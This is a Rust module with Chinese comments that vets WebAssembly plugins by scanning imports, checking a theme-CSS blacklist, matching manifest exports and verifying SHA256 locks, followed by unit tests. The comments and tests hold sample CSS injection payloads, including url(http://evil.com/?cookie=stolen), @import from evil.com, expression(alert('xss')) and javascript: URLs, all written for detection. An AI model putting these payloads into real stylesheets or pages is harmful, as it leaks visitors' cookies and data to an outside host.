//! Phase 9.2 — 插件安全检测套件。
//!
//! 与运行时沙箱（fuel / memory / timeout / output cap，见 [`crate::PluginManager`]
//! Phase 8.1 实现）互补的**静态 + 字节级**检测，在装载前 / 输出聚合时跑，
//! 命中即拒绝或跳过，不影响正常路径。
//!
//! 本模块提供 4 类检测：
//!
//! 1. [`scan_imports`] —— wasm import 白名单 = ∅。当前宿主未暴露任何 host fn，
//!    任何 `(import ...)` 都视为不安全（防止未来误开 IO 被滥用）
//! 2. [`sanitize_theme_css`] —— theme CSS 黑名单字符串扫描，挡常见 CSS 注入
//!    数据外渗（`url(http://...)` / `@import` / `expression()` / `behavior:` / `javascript:`）
//! 3. [`verify_manifest_consistency`] —— manifest 声明的 capability 必须对应
//!    实际导出的 fn；缺失即拒，多余仅作 warn
//! 4. [`verify_sha256`] —— site.json `plugins_lock` 记录预期 hash，加载前比对，
//!    挡"插件文件被偷换"
//!
//! Ed25519 签名校验：fork 模式下用户极少生成 PEM 公钥，本 phase 不实现；
//! 留待后续若有真实需求再加。SHA256 lock 已经能挡绝大多数文件篡改场景。

use sdk::PluginManifest;
use wasmi::Module;

/// 通用必备 export（所有 capability 都应有的）。
const COMMON_EXPORTS: &[&str] = &["get_manifest", "alloc", "memory"];

/// 按 capability 期望的必备 export 集合。
///
/// 返回 `&'static [&'static str]` 而不是 `Vec`，因为 capability 表很小且固定。
fn required_exports(capability: &str) -> &'static [&'static str] {
  match capability {
    sdk::capabilities::THEME => &["get_theme_css"],
    sdk::capabilities::I18N => &["translate"],
    sdk::capabilities::AUTH_PROVIDER => {
      &["get_config", "exchange_code", "fetch_profile", "get_display_info"]
    }
    sdk::capabilities::MODERATION_PROVIDER => {
      &["moderation_build_prompt", "moderation_parse_verdict"]
    }
    // notification / layout / mdx-component / content-transformer 暂未定 ABI，
    // 留作 Phase 9.3+ 加入时再扩此表。
    _ => &[],
  }
}

/// 扫描 wasm 模块的所有 import 段。
///
/// 当前宿主（[`crate::PluginManager`]）的 `Linker` 没有 `define` 任何 host fn，
/// 所以任何 import 必然在实例化时失败 —— 提前在这里拒绝，能给出明确错误而非
/// 隐晦的 "function not found in linker"。同时也防"未来误暴露 host fn 被旧
/// 恶意插件捡漏"。
///
/// 返回 `Ok(())` 表示无 import；`Err(msg)` 列出所有 import 便于排查。
pub fn scan_imports(module: &Module) -> Result<(), String> {
  let imports: Vec<String> =
    module.imports().map(|imp| format!("{}::{}", imp.module(), imp.name())).collect();
  if imports.is_empty() {
    Ok(())
  } else {
    Err(format!(
      "plugin declares {} disallowed import(s): {}",
      imports.len(),
      imports.join(", ")
    ))
  }
}

/// theme CSS 黑名单 pattern。命中任何一个 = 整段 CSS 拒绝（不进 `<style>`）。
///
/// 字符串小写匹配，不是完整 CSS parser —— 已知攻击模式有限且固定，正则也够用，
/// 但简单 `contains` 更易读 + 性能足够（每次 page render 跑一次，CSS 通常 < 8KB）。
///
/// 攻击场景：
/// - `url(http://evil.com/?cookie=...)` —— CSS 注入做数据外渗（受害者浏览器
///   主动发请求，攻击者拿到 referrer / cookie / IP）
/// - `@import url(...)` —— 同上
/// - `expression(...)` / `behavior:` —— 老 IE 攻击向量，遗留考虑
/// - `javascript:` / `vbscript:` —— 在 `url()` / `content` 等场景下能执行
const THEME_CSS_BLACKLIST: &[&str] = &[
  "url(http://",
  "url(https://",
  "url(//",
  "url('http://",
  "url('https://",
  "url(\"http://",
  "url(\"https://",
  "@import",
  "expression(",
  "behavior:",
  "javascript:",
  "vbscript:",
];

/// 检查 theme CSS 是否包含危险 pattern（大小写不敏感）。
///
/// 返回命中的 pattern 列表；空 vec 表示通过。调用者命中时应跳过该插件 CSS
/// 整段（不部分清洗），同时记 warn 日志。
///
/// 允许的合法场景：
/// - `url(/assets/...)` —— 站内相对路径
/// - `url(data:image/png;base64,...)` —— 内联 base64 图片（CSP 配合限制 MIME）
pub fn sanitize_theme_css(css: &str) -> Vec<&'static str> {
  let lower = css.to_lowercase();
  THEME_CSS_BLACKLIST.iter().filter(|pat| lower.contains(*pat)).copied().collect()
}

/// 校验 manifest 声明的 capability 与 wasm 实际 exports 是否对齐。
///
/// 返回值：
/// - `Ok(extras)` —— capability 必备 export 齐全；`extras` 是 export 中**多余**
///   的项（不属于通用 + 任何已声明 capability 的必备集），调用者可记 warn
/// - `Err(msg)` —— 缺必备 export，列出哪些缺失 + 拒绝加载
///
/// "多余 export" 的常见正当来源：插件内部辅助 fn 标了 `#[no_mangle]`、
/// `dealloc`（与 `alloc` 配对但不强制）、宏生成的 `__plugin_inner_*` 等。
/// 本检测只拒绝**缺失**，不拒绝多余。
pub fn verify_manifest_consistency(
  manifest: &PluginManifest,
  module: &Module,
) -> Result<Vec<String>, String> {
  let exports: Vec<String> = module.exports().map(|e| e.name().to_string()).collect();

  let mut expected: Vec<&'static str> = COMMON_EXPORTS.to_vec();
  for cap in &manifest.capabilities {
    expected.extend(required_exports(cap));
  }

  let missing: Vec<&'static str> =
    expected.iter().filter(|e| !exports.iter().any(|name| name == *e)).copied().collect();

  if !missing.is_empty() {
    return Err(format!(
      "plugin '{}' declares capabilities {:?} but missing exports: {:?}",
      manifest.id, manifest.capabilities, missing
    ));
  }

  let extras: Vec<String> = exports
    .into_iter()
    .filter(|name| !expected.iter().any(|e| *e == name))
    .filter(|name| name != "dealloc")
    .filter(|name| !name.starts_with("__"))
    .collect();
  Ok(extras)
}

/// 校验 wasm 字节的 SHA256 是否匹配预期 hex 摘要。
///
/// `expected_hex` 大小写不敏感；实际值小写化后与之比对。
///
/// 用于 site.json `plugins_lock` 字段：fork 用户运行 `lock_plugins` CLI 生成
/// 每个插件的 sha256 写入 site.json，之后宿主每次加载都比对，防止文件被外部
/// 偷换（例如供应链攻击中替换 release 包内的 .wasm）。
#[cfg(feature = "server")]
pub fn verify_sha256(bytes: &[u8], expected_hex: &str) -> Result<(), String> {
  use sha2::{Digest, Sha256};
  let mut hasher = Sha256::new();
  hasher.update(bytes);
  let actual = format!("{:x}", hasher.finalize());
  let expected_lower = expected_hex.to_lowercase();
  if actual == expected_lower {
    Ok(())
  } else {
    Err(format!("sha256 mismatch (expected {}, got {})", expected_lower, actual))
  }
}

/// 综合检测报告。`admin_upload_plugin` / lock CLI 可一次性产出给 UI 展示。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SecurityReport {
  pub imports_ok: bool,
  pub imports_detail: Option<String>,
  pub manifest_ok: bool,
  pub manifest_detail: Option<String>,
  pub manifest_extras: Vec<String>,
  /// `None` 表示未提供 expected hex（即 site.json 无 lock）；
  /// `Some(true)` 通过；`Some(false)` 不匹配（带详情）。
  pub sha256_status: Option<Result<(), String>>,
}

impl SecurityReport {
  pub fn is_hard_failure(&self) -> bool {
    !self.imports_ok
      || !self.manifest_ok
      || matches!(self.sha256_status, Some(Err(_)))
  }
}

#[cfg(all(test, feature = "server"))]
mod tests {
  use super::*;
  use sdk::{capabilities, PluginManifest};
  use std::path::Path;
  use wasmi::{Config, Engine};

  fn load_module(path: &Path) -> Option<Module> {
    if !path.exists() {
      return None;
    }
    let bytes = std::fs::read(path).ok()?;
    let mut config = Config::default();
    config.consume_fuel(true);
    let engine = Engine::new(&config);
    Module::new(&engine, &bytes).ok()
  }

  // ─── scan_imports ─────────────────────────────────────────

  #[test]
  fn scan_imports_passes_for_real_plugin() {
    let Some(module) =
      load_module(Path::new("../../assets/plugins/i18n_fluent_plugin.wasm"))
    else {
      return;
    };
    let result = scan_imports(&module);
    assert!(result.is_ok(), "i18n_fluent should have no imports: {:?}", result);
  }

  #[test]
  fn scan_imports_rejects_module_with_import() {
    // 构造一段包含 import 的最小 wasm（声明 import "env" "log" func）
    let wat = r#"
      (module
        (import "env" "log" (func $log (param i32)))
        (func (export "noop"))
      )
    "#;
    let wasm = wat::parse_str(wat).expect("wat → wasm");
    let mut config = Config::default();
    config.consume_fuel(true);
    let engine = Engine::new(&config);
    let module = Module::new(&engine, &wasm).expect("module");
    let result = scan_imports(&module);
    assert!(result.is_err());
    let msg = result.unwrap_err();
    assert!(msg.contains("env::log"), "msg should list import: {}", msg);
  }

  // ─── sanitize_theme_css ──────────────────────────────────

  #[test]
  fn css_sanitize_passes_normal_css() {
    let css = ":root { --color-primary: #7c3aed; }\nbody { background: var(--color-bg); }";
    assert!(sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_passes_data_url_image() {
    let css = ".logo { background: url(data:image/png;base64,iVBORw0KG); }";
    assert!(sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_passes_relative_path() {
    let css = ".banner { background: url(/assets/banner.png); }";
    assert!(sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_external_url() {
    let css = "body { background: url(http://evil.com/?cookie=stolen); }";
    let hits = sanitize_theme_css(css);
    assert!(hits.iter().any(|p| p.contains("url(http://")));
  }

  #[test]
  fn css_sanitize_rejects_external_https_url() {
    let css = "body { background: url(https://evil.com/track); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_protocol_relative_url() {
    let css = "body { background: url(//evil.com/track); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_import() {
    let css = "@import 'https://evil.com/x.css';";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_expression() {
    let css = "body { width: expression(alert('xss')); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_behavior() {
    let css = ".x { behavior: url(xss.htc); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_javascript_url() {
    let css = "a { content: url(javascript:alert(1)); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_case_insensitive() {
    let css = "body { background: URL(HTTP://EVIL.COM/x); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  // ─── verify_manifest_consistency ─────────────────────────

  #[test]
  fn manifest_consistency_passes_for_real_i18n_plugin() {
    let Some(module) =
      load_module(Path::new("../../assets/plugins/i18n_fluent_plugin.wasm"))
    else {
      return;
    };
    let manifest = PluginManifest::new("i18n-fluent", "i18n Fluent", "0.1.0")
      .with_capability(capabilities::I18N);
    let result = verify_manifest_consistency(&manifest, &module);
    assert!(result.is_ok(), "should pass for real plugin: {:?}", result);
  }

  #[test]
  fn manifest_consistency_rejects_missing_export() {
    // 用 i18n 模块假装它声明 auth-provider capability —— 必然缺 exchange_code
    let Some(module) =
      load_module(Path::new("../../assets/plugins/i18n_fluent_plugin.wasm"))
    else {
      return;
    };
    let bad_manifest = PluginManifest::new("fake-auth", "Fake", "0.1.0")
      .with_capability(capabilities::AUTH_PROVIDER);
    let result = verify_manifest_consistency(&bad_manifest, &module);
    assert!(result.is_err(), "should reject: i18n module has no exchange_code");
    let msg = result.unwrap_err();
    assert!(msg.contains("exchange_code"));
  }

  // ─── verify_sha256 ───────────────────────────────────────

  #[test]
  fn sha256_passes_on_match() {
    let bytes = b"hello world";
    // sha256("hello world") = b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9
    let result = verify_sha256(
      bytes,
      "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9",
    );
    assert!(result.is_ok());
  }

  #[test]
  fn sha256_case_insensitive_match() {
    let bytes = b"hello world";
    let result = verify_sha256(
      bytes,
      "B94D27B9934D3E08A52E52D7DA7DABFAC484EFE37A5380EE9088F7ACE2EFCDE9",
    );
    assert!(result.is_ok());
  }

  #[test]
  fn sha256_rejects_on_mismatch() {
    let bytes = b"hello world";
    let result = verify_sha256(bytes, "deadbeef");
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("mismatch"));
  }

  // ─── SecurityReport ──────────────────────────────────────

  #[test]
  fn report_is_hard_failure_when_imports_bad() {
    let r = SecurityReport {
      imports_ok: false,
      imports_detail: Some("env::log".into()),
      manifest_ok: true,
      manifest_detail: None,
      manifest_extras: vec![],
      sha256_status: None,
    };
    assert!(r.is_hard_failure());
  }

  #[test]
  fn report_is_hard_failure_when_sha256_mismatch() {
    let r = SecurityReport {
      imports_ok: true,
      imports_detail: None,
      manifest_ok: true,
      manifest_detail: None,
      manifest_extras: vec![],
      sha256_status: Some(Err("mismatch".into())),
    };
    assert!(r.is_hard_failure());
  }

  #[test]
  fn report_clean_run_is_not_failure() {
    let r = SecurityReport {
      imports_ok: true,
      imports_detail: None,
      manifest_ok: true,
      manifest_detail: None,
      manifest_extras: vec!["__plugin_inner_translate".into()],
      sha256_status: Some(Ok(())),
    };
    assert!(!r.is_hard_failure());
  }
}
